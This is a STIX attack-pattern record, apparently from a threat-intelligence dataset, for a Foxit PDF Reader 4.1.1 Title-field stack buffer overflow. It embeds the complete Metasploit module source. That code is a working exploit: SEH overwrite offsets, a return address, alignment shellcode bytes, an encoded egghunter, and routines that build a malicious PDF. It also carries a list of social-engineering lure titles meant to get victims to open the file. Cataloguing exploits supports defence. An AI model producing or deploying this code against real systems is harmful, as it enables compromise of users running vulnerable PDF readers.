{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--50b25230-d8e5-47b2-9970-846b6391f445",
    "created": "2024-08-14T16:37:19.23178Z",
    "modified": "2024-08-14T16:37:19.231785Z",
    "name": "Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Foxit PDF Reader prior to version 4.2.0.0928. The vulnerability is triggered when opening a malformed PDF file that contains an overly long string in the Title field. This results in overwriting a structured exception handler record.  NOTE: This exploit does not use javascript.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/foxit_title_bof.rb",
            "external_id": "foxit_title_bof.rb"
        },
        {
            "source_name": "#CVE",
            "external_id": ""
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/11/13/offensive-security-exploit-weekend/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::PDF\n  include Msf::Exploit::Egghunter\n  #include Msf::Exploit::Seh # unused due to special circumstances\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow',\n      'Description' \t=> %q{\n          This module exploits a stack buffer overflow in Foxit PDF Reader prior to version\n        4.2.0.0928. The vulnerability is triggered when opening a malformed PDF file that\n        contains an overly long string in the Title field. This results in overwriting a\n        structured exception handler record.\n\n        NOTE: This exploit does not use javascript.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=>\n        [\n          'dookie',        # Discovered the bug\n          'Sud0',          # Original exploit (from Offsec Exploit Weekend)\n          'corelanc0d3r <peter.ve[at]corelan.be>',  # Metasploit exploit\n          'jduck'          # Metasploit-fu\n        ],\n      'References'     =>\n        [\n          #[ 'CVE', '' ],\n          [ 'OSVDB', '68648' ],\n          [ 'EDB', '15532' ],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/11/13/offensive-security-exploit-weekend/' ]\n        ],\n      'Payload'\t=>\n        {\n          'BadChars'\t=>  \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0d\\x2F\\x5c\\x3c\\x3e\\x5e\\x7e\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EDI',  # egghunter jmp edi\n            }\n        },\n      'Platform'\t=> 'win',\n      'Targets'\t=>\n        [\n          [ 'Foxit Reader v4.1.1 XP Universal', { 'Offset' => 540, 'Ret' => \"\\x4B\\x6A\" } ]  #unicode p/p/r foxit reader.exe\n        ],\n      'DisclosureDate' => '2010-11-13',\n      'DefaultTarget'\t=> 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The output filename.', 'corelan_foxit.pdf'])\n      ])\n  end\n\n  def exploit\n    @label = rand_text_alpha(7)\n\n    nseh = \"\\x5A\\x41\" # pop edx -- to make edx writable\n    seh = target['Ret']\n\n    # inc ecx / pop esp / popad / push esp / ret\n    align = \"\\x41\\x61\\x5C\\x5C\\x41\\x61\\x41\\x54\\x41\\xC3\"\n    ecx_control = \"\\xB3\\x30\\xB3\" # becomes ecx\n\n    hunter, @egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    # Encode with alphamixed, then unicode mixed\n    [ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~ /unicode/\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })\n      else\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })\n      end\n      # NOTE: we already eliminated badchars\n      hunter = enc.encode(hunter, nil, nil, platform)\n      if name =~/alpha/\n        #insert getpc_stub & align EDX, unicode encoder friendly.\n        #Hardcoded stub is not an issue here because it gets encoded anyway\n        getpc_stub = \"\\x89\\xe1\\xdb\\xcc\\xd9\\x71\\xf4\\x5a\\x83\\xc2\\x41\\x83\\xea\\x35\"\n        hunter = getpc_stub + hunter\n      end\n    }\n    #tweak hunter, patched to make it write to ECX\n    hunter[1] = \"a\"\n\n    doctitles = [\n      \"Confidential : Contract + Terms of Use\",\n      \"Contract information\",\n      \"Acquisition contract\",\n      \"...loading, please wait...\",\n      \"Trademark, patent and copyright information\",\n      \"Limited Liability Partnership\",\n      \"Partnership agreement\",\n      \"Last will and testament\",\n      \"How to hack gmail\",\n      \"Running Metasploit on Windows Mobile\",\n      \"Free torrent sites\",\n      \"Lady Gaga naked\",\n      \"Free Shopping vouchers\"\n    ]\n\n    sploit = ''\n    sploit << doctitles[rand(doctitles.length)]\n    sploit << \" \" * (target['Offset'] - sploit.length)\n    sploit << nseh << seh\n    sploit << align\n    sploit << ecx_control\n    sploit << hunter\n\n    file_create(make_pdf(sploit))\n  end\n\n  # Override the mixin obfuscator since it doesn't seem to work here.\n  def n_obfu(str)\n    return str\n  end\n\n  def trailer(root_obj)\n    ret = 'trailer'\n    ret << n_obfu(\"<</Size %d/Root \" % (@xref.length + 1)) << io_ref(root_obj)\n    ret << n_obfu(\"/Info \") << io_ref(5)\n    ret << n_obfu(\"/#{@label} #{@egg}\")\n    ret << n_obfu(\">>\")\n    ret << eol\n    ret\n  end\n\n  def make_pdf(sploit)\n    @pdf << header('1.4')\n\n    add_object(1, n_obfu(\"<</ViewerPreferences<</DisplayDocTitle true>>/Outlines \") << io_ref(2) << n_obfu(\"/Pages \") << io_ref(3) << n_obfu(\"/Type/Catalog/Lang(en-US)>>\"))\n    add_object(2, n_obfu(\"<</Type/Outlines/Count 0>>\"))\n    add_object(3, n_obfu(\"<</Count 1/Type/Pages/Kids[\") << io_ref(4) << n_obfu(\"]>>\"))\n    add_object(4, n_obfu(\"<</Type/Page/Parent \") << io_ref(3) << n_obfu(\"/MediaBox[0 0 612 792]>>\"))\n    add_object(5, n_obfu(\"<</Title (\") + sploit + n_obfu(\")>>\"))\n\n    finish_pdf\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-13",
    "x_mitre_platforms": [
        "win'"
    ]
}